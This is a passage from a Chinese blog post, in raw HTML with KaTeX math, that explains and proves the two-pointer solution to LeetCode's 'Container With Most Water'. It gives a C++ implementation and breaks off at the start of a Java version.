aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">49</span></span></span></span>。由于右指针对应的数字较小，我们移动右指针：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1, 8, 6, 2, 5, 4, 8, 3, 7]</span><br><span class="line">    ^                 ^</span><br></pre></td></tr></table></figure><p>此时可以容纳的水量为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>8</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>6</mn><mo>=</mo><mn>18</mn></mrow><annotation encoding="application/x-tex">\min(8, 3) * 6 = 18</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">18</span></span></span></span>。由于右指针对应的数字较小，我们移动右指针：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1, 8, 6, 2, 5, 4, 8, 3, 7]</span><br><span class="line">       ^              ^</span><br></pre></td></tr></table></figure><p>此时可以容纳的水量为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>8</mn><mo separator="true">,</mo><mn>8</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>5</mn><mo>=</mo><mn>40</mn></mrow><annotation encoding="application/x-tex">\min(8, 8) * 5 = 40</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">40</span></span></span></span>。两指针对应的数字相同，我们可以任意移动一个，例如左指针：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1, 8, 6, 2, 5, 4, 8, 3, 7]</span><br><span class="line">       ^           ^</span><br></pre></td></tr></table></figure><p>此时可以容纳的水量为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>8</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>4</mn><mo>=</mo><mn>24</mn></mrow><annotation encoding="application/x-tex">\min(6, 8) * 4 = 24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span>。由于左指针对应的数字较小，我们移动左指针，并且可以发现，在这之后左指针对应的数字总是较小，因此我们会一直移动左指针，直到两个指针重合。在这期间，对应的可以容纳的水量为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>2</mn><mo separator="true">,</mo><mn>8</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>3</mn><mo>=</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">\min(2, 8) * 3 = 6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>8</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>2</mn><mo>=</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">\min(5, 8) * 2 = 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>4</mn><mo separator="true">,</mo><mn>8</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>1</mn><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">\min(4, 8) * 1 = 4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>。</p><p>在我们移动指针的过程中，计算到的最多可以容纳的数量为 4949，即为最终的答案。</p><p>下面的动画也给出了这个示例的过程：</p><p><img src="Container.gif" alt=""></p><p><strong>证明</strong></p><p>为什么双指针的做法是正确的？</p><blockquote><p>双指针代表了什么？</p></blockquote><p>双指针代表的是 <strong>可以作为容器边界的所有位置的范围</strong>。在一开始，双指针指向数组的左右边界，表示 <strong>数组中所有的位置都可以作为容器的边界</strong>，因为我们还没有进行过任何尝试。在这之后，我们每次将 <strong>对应的数字较小的那个指针</strong> 往 <strong>另一个指针</strong> 的方向移动一个位置，就表示我们认为 <strong>这个指针不可能再作为容器的边界了</strong>。</p><blockquote><p>为什么对应的数字较小的那个指针不可能再作为容器的边界了？</p></blockquote><p>在上面的分析部分，我们对这个问题有了一点初步的想法。这里我们定量地进行证明。</p><p><strong>考虑第一步</strong>，假设当前左指针和右指针指向的数分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，不失一般性，我们假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>≤</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \leq y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>。同时，两个指针之间的距离为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span>。那么，它们组成的容器的容量为：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>t</mi><mo>=</mo><mi>x</mi><mo>∗</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">\min(x, y) * t = x * t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span></p><p>我们可以断定，<strong>如果我们保持左指针的位置不变，那么无论右指针在哪里，这个容器的容量都不会超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∗</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">x * t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span> 了</strong>。注意这里右指针只能向左移动，因为 <strong>我们考虑的是第一步</strong>，也就是 <strong>指针还指向数组的左右边界的时候</strong>。</p><p>我们任意向左移动右指针，指向的数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，两个指针之间的距离为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">t_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，那么显然有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mn>1</mn></msub><mo>&lt;</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">t_1 &lt; t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span> ，并且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>≤</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\min(x, y_1) \leq \min(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> :</p><ul><li><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub><mo>≤</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">y_1 \leq y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> ，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>≤</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\min(x, y_1) \leq \min(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> ;</p></li><li><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub><mo>&gt;</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">y_1 &gt; y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> ，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mo>=</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\min(x, y_1) = x = \min(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> 。</p></li></ul><p>因此有：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><msub><mi>y</mi><mi>t</mi></msub><mo stretchy="false">)</mo><mo>∗</mo><msub><mi>t</mi><mn>1</mn></msub><mo>&lt;</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">\min(x, y_t) * t_1 &lt; \min(x, y) * t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span></p><p>即无论我们怎么移动右指针，得到的容器的容量都小于移动前容器的容量。也就是说，<strong>这个左指针对应的数不会作为容器的边界了</strong> ，那么我们就可以丢弃这个位置，<strong>将左指针向右移动一个位置</strong> ，此时新的左指针于原先的右指针之间的左右位置，才可能会作为容器的边界。</p><p>这样以来，我们将问题的规模减小了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，被我们丢弃的那个位置就相当于消失了。<strong>此时的左右指针，就指向了一个新的、规模减少了的问题的数组的左右边界</strong> ，因此，我们可以继续像之前 考虑第一步 那样考虑这个问题：</p><ul><li><p>求出当前双指针对应的容器的容量；</p></li><li><p>对应数字较小的那个指针以后不可能作为容器的边界了，将其丢弃，并移动对应的指针。</p></li></ul><blockquote><p>最后的答案是什么？</p></blockquote><p>答案就是我们每次以双指针为左右边界（也就是「数组」的左右边界）计算出的容量中的最大值。</p><p>作者：LeetCode-Solution</p></blockquote><p>看懂了理论之后，突然清晰了很多，把之前的代码补充完便成功了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maX = <span class="number">0</span>, n = height.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">            maX = <span class="built_in">max</span>(maX, (right - left) * <span class="built_in">min</span>(height[left], height[right]));</span><br><span class="line">            <span class="keyword">if</span>(height[left] &lt; height[right]) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> maX;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>76 ms</strong></p></li><li><p>内存消耗: <strong>57.6 MB</strong></p></li></ul><p>这里继续联系联系 Java 实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 